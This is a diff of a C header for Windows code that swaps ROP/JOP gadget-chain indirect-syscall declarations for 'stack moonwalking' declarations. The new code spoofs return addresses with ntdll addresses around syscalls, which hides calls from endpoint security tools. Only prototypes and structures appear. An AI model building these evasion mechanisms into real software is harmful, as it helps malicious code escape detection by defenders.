@@ -75,51 +75,43 @@ typedef struct Section {
     DWORD Characteristics;
 }Section;
 
-// ========== JOPCALL INTEGRATION - NEW STRUCTURES ==========
+// ========== STACK MOONWALKING - NEW STRUCTURES ==========
 
-#define MAX_GADGETS 12
-#define MAX_GADGET_CHAIN 5
-#define SECTION_MEM_EXECUTE 0x20000000
+#define MAX_STACK_FRAMES 16
 
-// Memory section structure for gadget scanning (ported from jopcall/src/jop.rs:11)
-typedef struct MemorySection {
-    DWORD virtual_size;
-    PVOID address;
-    DWORD characteristics;
-} MemorySection, *PMemorySection;
-
-// ROP/JOP Gadget chain structure
-typedef struct GadgetChain {
-    PVOID gadgets[MAX_GADGET_CHAIN];  // Array of gadget addresses
-    DWORD count;                       // Number of gadgets in chain
-} GadgetChain, *PGadgetChain;
-
-// Syscall information structure (ported from jopcall/src/syscall.rs:12)
-typedef struct SyscallInfo {
-    WORD ssn;              // System Service Number
-    PVOID address;         // Address of syscall instruction
-    BOOL hooked;           // Whether syscall is hooked
-} SyscallInfo, *PSyscallInfo;
-
-// ========== JOPCALL INTEGRATION - FUNCTION DECLARATIONS ==========
-
-// Gadget discovery functions (ported from jopcall/src/jop.rs)
-DWORD get_image_memory_sections(PVOID dll_base_address, MemorySection* section_buffer, DWORD max_sections);
-DWORD search_gadget(BYTE* gadget_asm, DWORD gadget_size, MemorySection* section_list, DWORD section_count, PVOID* gadget_buffer, DWORD max_gadgets);
-BOOL find_rop_gadgets(Dll* ntdll_module, GadgetChain* chain);
-
-// Helper functions (ported from jopcall/src/helper.rs)
-DWORD search_bytes(BYTE* pattern, DWORD pattern_len, BYTE* source, DWORD source_len);
-PVOID pick_random_gadget(PVOID* gadget_array, DWORD gadget_count);
-DWORD pseudorandom();
-
-// ROP-based syscall execution (ported from jopcall/src/syscall.rs:181)
-extern LONG32 NTAPI jop_syscall(PVOID* gadget_list, WORD gadget_count, WORD ssn, PVOID syscall_addr, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5);
+// Stack frame snapshot for moonwalking
+// Stores original return addresses that will be temporarily replaced
+typedef struct StackSnapshot {
+    PVOID original_addresses[MAX_STACK_FRAMES];  // Original return addresses
+    PVOID spoof_addresses[MAX_STACK_FRAMES];     // Ntdll addresses to spoof with
+    PVOID* frame_locations[MAX_STACK_FRAMES];    // Stack locations to modify
+    DWORD count;                                  // Number of frames captured
+} StackSnapshot, *PStackSnapshot;
 
 #if !defined(NTSTATUS)
 typedef LONG NTSTATUS;
 typedef NTSTATUS *PNTSTATUS;
 #endif
+
+// ========== STACK MOONWALKING - FUNCTION DECLARATIONS ==========
+
+// Stack moonwalking syscall wrapper
+// Captures stack, replaces return addresses, executes syscall, restores stack
+NTSTATUS moonwalk_syscall(
+    WORD ssn,               // System Service Number
+    PVOID syscall_addr,     // Address of syscall instruction
+    PVOID ntdll_base,       // Ntdll base for finding spoof addresses
+    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5
+);
+
+// Capture current stack frames and return addresses
+BOOL capture_stack_snapshot(StackSnapshot* snapshot, PVOID ntdll_base, DWORD max_frames);
+
+// Replace return addresses on stack with ntdll addresses
+VOID spoof_stack_frames(StackSnapshot* snapshot);
+
+// Restore original return addresses after syscall
+VOID restore_stack_frames(StackSnapshot* snapshot);
 
 #define WOW64_POINTER(Type) ULONG
 typedef struct _CLIENT_ID
